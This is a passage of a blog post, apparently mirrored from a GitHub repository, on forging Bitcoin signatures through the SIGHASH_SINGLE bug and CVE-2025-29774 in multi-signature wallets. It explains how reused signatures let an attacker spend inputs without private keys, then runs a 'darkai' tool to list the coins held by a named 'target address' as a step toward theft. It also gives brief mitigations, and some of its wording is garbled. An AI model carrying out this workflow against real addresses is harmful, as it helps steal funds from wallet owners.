<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-35-1024x36.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-35-1024x36.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Decrypting digital signatures</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#decrypting-digital-signatures"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The variable&nbsp;<code>sigs</code>stores two decrypted signatures obtained through the function&nbsp;<code>der_decode_sig</code>from their DER-encoded form:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><em>First signature:</em></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>3045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c2903</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true,"start":2} -->
<ol start="2" class="wp-block-list"><!-- wp:list-item -->
<li><em>Second signature:</em></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b803</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The DER (Distinguished Encoding Rules) format is a standard way of encoding structures for ECDSA signatures in Bitcoin, which guarantees a unique and correct representation of the signature parameters&nbsp;<code>r</code>&nbsp;and&nbsp;<code>s</code>.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">The hash used for verification</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-hash-used-for-verification"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The hash was used to verify the signature:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>It is a 32-byte sequence where the first byte is&nbsp;<code>0x01</code>, and the rest are zeros. In the context of Bitcoin, such a hash serves as an example or test value that is compared with the original transaction hash to verify keys.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Verification of signature authenticity</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#verification-of-signature-authenticity"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Verification was performed by the function&nbsp;<code>ecdsa_raw_verify(hash, signature, public_key)</code>, which checks whether the digital signature matches the specified hash and public key.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the example provided:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The first signature is valid for the first public key ( <code>pubs</code>), as confirmed by the returned value <code>True</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The second signature is valid for the second public key ( <code>pubs[1]</code>), also confirmed by <code>True</code>.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>This means that these signatures were actually created by the owners of the corresponding private keys and correctly match the given hash.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-6.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-6.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Vulnerability as a Meaning in the Context of an Outcome</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#vulnerability-as-a-meaning-in-the-context-of-an-outcome"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Possibility of errors and vulnerabilities:</strong> It is important to ensure that signatures are formed correctly – in particular, the low value rule is followed <code>s</code>, which prevents signature malleability issues and ensures consensus on the network (see BIP 62).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Ownership Guarantee:</strong> Successful verification of a digital signature proves ownership of the corresponding private key – only its owner can create a valid signature. This is the basis of Bitcoin security, preventing unauthorized spending.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>DER and Standards:</strong> The use of DER encoding and explicit indication of the signature type (including the SIGHASH flag, which determines which part of the transaction the signature is signed) complies with Bitcoin protocol standards.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading" id="user-content-bitcoin">Technical details about the Bitcoin signature process</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#technical-details-about-the-bitcoin-signature-process"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Transaction hashing:</strong> The signature is formed not over the entire transaction, but over its hash, which includes parts of the transaction depending on the SIGHASH flag.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>ECDSA Signatures:</strong> Bitcoin uses the Elliptic Curve Digital Signature Algorithm (ECDSA) to create signatures that provide cryptographic security.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Parameters r and s:</strong> The signature consists of two numeric parameters <code>r</code>and <code>s</code>. These parameters are packed into DER format for serial transmission or storage.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Signature verification:</strong> Network nodes verify signatures to ensure that the spending of funds is authorized.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The resulting digital signatures were successfully decoded and verified for correctness using public keys and a standardized hash. This confirms their authenticity, as well as the correctness of the signature generation process in accordance with the Bitcoin protocol.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-bitcoin-----sighashsingle">Bitcoin SIGHASH_SINGLE signature vulnerability and its consequences</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#bitcoin-sighash_single-signature-vulnerability-and-its-consequences"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Despite high security technologies, vulnerabilities are sometimes found in the Bitcoin network that can lead to theft of funds and loss of user trust. One such example was a serious signature type issue&nbsp;<code>SIGHASH_SINGLE (0x03)</code>that was discovered in practice in&nbsp;<strong>BitPay</strong>&nbsp;‘s&nbsp;<strong>Copay</strong>&nbsp;multi-signature wallet .<strong></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In Bitcoin, each signature has a special flag (SIGHASH) that defines the scope of the transaction that the signature covers. SIGHASH types affect the security and flexibility of transactions.&nbsp;<code>SIGHASH_SINGLE</code>is one such type that signs&nbsp;<strong>all inputs of a transaction</strong>&nbsp;, but&nbsp;<strong>only one output</strong>&nbsp;, whose number corresponds to the number of the input being signed.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Example: if a signature refers to the input with index 0 (&nbsp;<code>vin 0</code>), then it signs only the output with index 0 (&nbsp;<code>vout 0</code>).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In essence, this type allows a party to an agreement to confirm only part of the transfer – that the input data matches all inputs, and the expenditure goes to a specific address, without recording the other outputs.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Vulnerability&nbsp;<code>SIGHASH_SINGLE</code>&nbsp;and its essence</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#vulnerabilitysighash_single-and-its-essence"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The problem occurs when a transaction&nbsp;<strong>has more inputs than outputs</strong>&nbsp;. In this case, an input whose index exceeds the last number of outputs&nbsp;<strong>has no corresponding output</strong>&nbsp;that can sign&nbsp;<code>SIGHASH_SINGLE</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In practice, the Bitcoin implementation allows for the erroneous behavior of returning a constant with the number one (&nbsp;<code>int 1</code>) instead of the transaction hash. This is equivalent to taking a fixed value for the signature instead of the computed hash. Because of this, an attacker can forge&nbsp;<code>scriptSig</code>and use valid signatures from another transaction for inputs with missing outputs,&nbsp;<strong>re-spending funds without knowing the private keys</strong>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>In other words, the attack allows a single-output transaction to be created under the attacker’s control by spending the inputs from the target transactions, even though the private keys to sign the original outputs are missing. This “repeat” signature&nbsp;<code>scriptSig</code>&nbsp;becomes legitimate for the network, leading to&nbsp;<strong>the theft of BTC coins</strong>&nbsp;.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Copay</strong>&nbsp;wallet&nbsp;was one of the first victims of the cryptographic attack of digital signature forgery (Digital Signature Forgery Attack). Analysis of the transaction status showed that:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The exploit <code>SIGHASH_SINGLE</code>allowed attackers to control funds distributed across a 2 of 3 multi-signature wallet.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This meant that two transaction inputs with indices greater than the number of outputs could actually be spent without private keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The theft occurred by creating a transaction with a single output to an address controlled by the attacker.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-19-1024x54.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-19-1024x54.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Ways to minimize the threat and further development of the protocol</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#ways-to-minimize-the-threat-and-further-development-of-the-protocol"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Script Isolation and Virtual Machine</strong><br>Solutions have been proposed to allocate separate virtual environments for multi-signature wallets to limit the impact of emerging vulnerabilities.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Using SIGHASH_ANYONECANPAY</strong><br>This additional flag allows for more flexibility in which inputs are subject to signature, reducing the risk of transactions being incorrectly linked.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Softfork and implementation of new sighash flags</strong><br>Modern proposals, such as <code>SIGHASH_NOINPUT</code>technical updates to the protocol, allow to improve the security and flexibility of second-layer transactions, for example, in the Lightning Network (LN-Symmetry, Eltoo).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Migration to Schnorr signature scheme and Taproot update</strong><br>New cryptographic methods provide more reliable and compact protection of signatures and allow for more efficient implementation of multi-signatures with minimal vulnerabilities.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The issue&nbsp;<code>SIGHASH_SINGLE</code>exposed a critical flaw in Bitcoin’s signature mechanism, allowing funds to be stolen by reusing signatures on inputs without corresponding outputs. The vulnerability became an important lesson and impetus for the protocol’s evolution, encouraging developers to implement more robust standards. Modern Bitcoin developments, such as new sighash flags, soft forks,&nbsp;<a href="https://cryptodeeptech.ru/bitcoin-lightning-wallet-vulnerability/">the Lightning Network</a>&nbsp;, and the move to more secure signature schemes, are aimed at preventing such attacks and improving user security.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Understanding this level of technical detail is critical for developers, wallet operators, and cryptocurrency analysts to ensure they can confidently protect their assets in the ever-evolving blockchain space.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Unspent transaction outputs of coins to Bitcoin Address under the control of the attacker</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#unspent-transaction-outputs-of-coins-to-bitcoin-address-under-the-control-of-the-attacker"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s run the command to get information about unspent transaction outputs (&nbsp;<code>UTXO</code>) under the control of the address&nbsp;<code>1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -unspent 1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The result obtained:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-result-obtained-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The output contains a list of one object describing a specific unspent transaction output (&nbsp;<code>output</code>):</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{  "output": "23e81960ba8bb95c33c2336c84c126e378e4d1123921f881da9247c25f524161:1",  "value": 300000}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-36-1024x35.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-36-1024x35.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Unspent Transaction Output (UTXO)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-unspent-transaction-output-utxo"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>UTXO</strong> is a ” <code>Unspent Transaction Output</code>“, i.e. a transaction output that has not yet been spent and is available for use in new transactions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In the Bitcoin network, funds are stored in exactly these outputs.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Each transaction has one or more outputs, each of which can contain a certain number of satoshi, the smallest units of value <code>Bitcoin</code>.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Output structure</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-output-structure"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>output</code>— a line consisting of two parts:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>23e81960ba8bb95c33c2336c84c126e378e4d1123921f881da9247c25f524161</code>— is <strong>txid</strong> , the identifier of the transaction in which this output was created.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>:1</code>— the index of a specific output in the transaction. In this case, it is the second output, since indexing starts from zero.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>value</code>— output value:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>300000</code>— the amount of funds in satoshi.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bitcoin conversion: 300,000 satoshi = 0.003 BTC</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-12.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-12.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. Meaning for the address owner</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3-meaning-for-the-address-owner"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>This UTXO is under the control of the address <code>1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This means that this user or wallet has the right to create a transaction using these 0.003 BTC from the specified output.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Access to use a UTXO is achieved by creating an input in a new transaction specifying it <code>output</code>as the source of funds and providing a valid signature.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. Practical application</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#4-practical-application"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>UTXO analysis and accounting allows:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Estimate the balance of the address.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Optimize the creation of new transactions – for example, choose UTXOs to minimize fees.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Ensure correct aggregation and spending of funds, avoiding errors when signing transactions.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Forming new transactions using these UTXOs;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Optimization of output selection to save on fees;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Analysis of other transactions and addresses;</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The team&nbsp;<code>./darkai -unspent</code>has successfully identified and returned one legitimate unspent transaction output controlled by the specified Bitcoin address. The amount of available funds is&nbsp;<code>0.003 BTC</code>. This result is the current budget status of the owner of this Bitcoin address and serves as the basis for forming and sending future transactions using these funds.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Unspent transaction results to target Bitcoin Address: 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#unspent-transaction-results-to-target-bitcoin-address-32gkpb9xjmaelr4q2hr31jdz2tnty18zce"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s run the command and get data on&nbsp;<strong>unspent transaction outputs (UTXO)</strong>&nbsp;associated with a Bitcoin address&nbsp;<code>32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</code>&nbsp;that contain certain funds in BTC coins.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -unspent 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Target address for Digital Signature Forgery Attack:</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#target-address-for-digital-signature-forgery-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The amount of available funds received Bitcoins is controlled by the user or the system executing the command.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Unspent Transaction Outputs (UTXO). After running, we get the result in a list of two UTXOs:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>&#91;  {    "output": "8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd:0",    "value": 677200  },  {    "output": "bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786:0",    "value": 5000000  }]</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-38-1024x22.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-38-1024x22.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Decoding of data and each element:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#decoding-of-data-and-each-element"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">1. First UTXO</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-first-utxo"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Transaction ID (txid):</strong> <code>8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Output index:</strong> <code>0</code> (first output from transaction)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Meaning:</strong> <code>677200</code> satoshi</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Convert to Bitcoin: 677200/100000000 = 0.006772BTC</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-15.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-15.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">2. Second UTXO</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-second-utxo"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Transaction ID (txid):</strong> <code>bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Output index:</strong> <code>0</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Meaning:</strong> <code>5000000</code> satoshi</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Convert to Bitcoin: 5000000/100000000 = 0.05BTC</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
